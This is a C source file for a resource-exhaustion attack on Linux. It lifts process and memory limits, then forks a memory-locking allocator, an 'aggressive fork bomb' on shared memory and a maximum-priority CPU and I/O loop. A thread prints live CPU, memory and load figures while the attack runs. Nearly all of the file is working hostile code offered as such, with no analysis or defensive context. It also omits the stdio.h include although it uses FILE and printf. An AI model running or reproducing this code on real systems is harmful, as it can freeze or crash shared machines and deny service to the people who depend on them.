
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/sysinfo.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <string.h>
#include <time.h>

#define PAGE_SIZE 4096
#define MEM_CHUNK (1024 * 1024 * 512) // 512MB chunks
#define STATUS_INTERVAL 10 // Seconds
#define MAX_LOOPS 1000


typedef struct {
    unsigned long user, nice, system, idle, iowait;
} CPUStats;

CPUStats get_cpu_stats() {
    FILE* fp = fopen("/proc/stat", "r");
    CPUStats stats = {0};
    if (fp) {
        char line[256];
        if (fgets(line, sizeof(line), fp)) {
            if (strncmp(line, "cpu ", 4) == 0) {
                sscanf(line + 5, "%lu %lu %lu %lu %lu",
                       &stats.user, &stats.nice, &stats.system,
                       &stats.idle, &stats.iowait);
            }
        }
        fclose(fp);
    }
    return stats;
}

double calculate_cpu_usage(const CPUStats* prev, const CPUStats* curr) {
    const unsigned long prev_total = prev->user + prev->nice + prev->system +
                                   prev->idle + prev->iowait;
    const unsigned long curr_total = curr->user + curr->nice + curr->system +
                                   curr->idle + curr->iowait;
    const unsigned long total_diff = curr_total - prev_total;
    
    if (total_diff == 0) return 0.0;
    
    const unsigned long idle_diff = (curr->idle + curr->iowait) - 
                                  (prev->idle + prev->iowait);
    return 100.0 * (total_diff - idle_diff) / total_diff;
}

void* status_thread(void* arg) {
    time_t start_time = *(time_t*)arg;
    CPUStats prev = get_cpu_stats();
    
    while(1) {
        time_t now;
        time(&now);
        double elapsed = difftime(now, start_time);
        int hours = (int)elapsed / 3600;
        int minutes = ((int)elapsed % 3600) / 60;
        int seconds = (int)elapsed % 60;

        CPUStats curr = get_cpu_stats();
        struct sysinfo info;
        
        if (sysinfo(&info) == 0) {
            const double cpu_usage = calculate_cpu_usage(&prev, &curr);
            const double free_ram = (double)info.freeram * info.mem_unit / (1024 * 1024 * 1024);
            
            printf("\n=== System Status [%02d:%02d:%02d] ===\n", 
                   hours, minutes, seconds);
            printf("Memory Free: %.2f GB\n", free_ram);
            printf("Processes:   %lu\n", info.procs);
            printf("CPU Usage:   %.1f%%\n", cpu_usage);
            printf("Load Avg:    %.2f, %.2f, %.2f\n",
                   (double)info.loads[0]/65536.0,
                   (double)info.loads[1]/65536.0,
                   (double)info.loads[2]/65536.0);
        }
        
        prev = curr;
        sleep(STATUS_INTERVAL);
    }
    return NULL;
}

// Lock and permanently hold memory
void memory_attack() {
    if (mlockall(MCL_CURRENT | MCL_FUTURE) != 0) {
        perror("mlockall failed");
    }

    while(1) {
        void *block = malloc(MEM_CHUNK);
        if (!block) continue;
        
        // Commit memory by touching every page
        for (size_t i = 0; i < MEM_CHUNK; i += PAGE_SIZE) {
            ((char*)block)[i] = rand();
        }
        
        /* printf("Holding %.2f GB\n", MEM_CHUNK/(1024.0*1024*1024)); */
        sleep(1); // Prevent OOM killer priority boost
    }
}

// Aggressive fork bomb with shared memory
void process_attack() {
    // Create shared memory region
    int fd = open("/dev/zero", O_RDWR);
    void *shared = mmap(NULL, MEM_CHUNK, PROT_READ|PROT_WRITE, 
                       MAP_SHARED, fd, 0);
    close(fd);

    while(1) {
        if (fork() == 0) {
            // Child modifies shared memory
            for (size_t i = 0; i < MEM_CHUNK; i += PAGE_SIZE) {
                ((char*)shared)[i] = rand();
            }
            while(1);
        }
    }
}

// CPU+IO stress with priority manipulation
void cpu_io_attack() {
    if (nice(-20) == -1) { // Max priority
        perror("nice failed");
    }

    int fd = open("/dev/urandom", O_RDONLY);
    char buf[PAGE_SIZE];
    
    while(1) {
        read(fd, buf, PAGE_SIZE);
        for (int i = 0; i < 1000; i++) {
            getpid();
            sched_yield();
        }
    }
}

int main() {
    // Record start time
    time_t start_time;
    time(&start_time);

    // Remove all resource limits
    struct rlimit rlim = {RLIM_INFINITY, RLIM_INFINITY};
    setrlimit(RLIMIT_NPROC, &rlim);
    setrlimit(RLIMIT_MEMLOCK, &rlim);
    setrlimit(RLIMIT_AS, &rlim);

    // Start monitoring thread
    pthread_t monitor;
    pthread_create(&monitor, NULL, status_thread, &start_time);

    // Start attack vectors
    if (fork() == 0) memory_attack();
    if (fork() == 0) process_attack();
    if (fork() == 0) cpu_io_attack();

    // Parent maintains execution
    while(1) {
        malloc(1024); // Prevent optimizations
    }
}
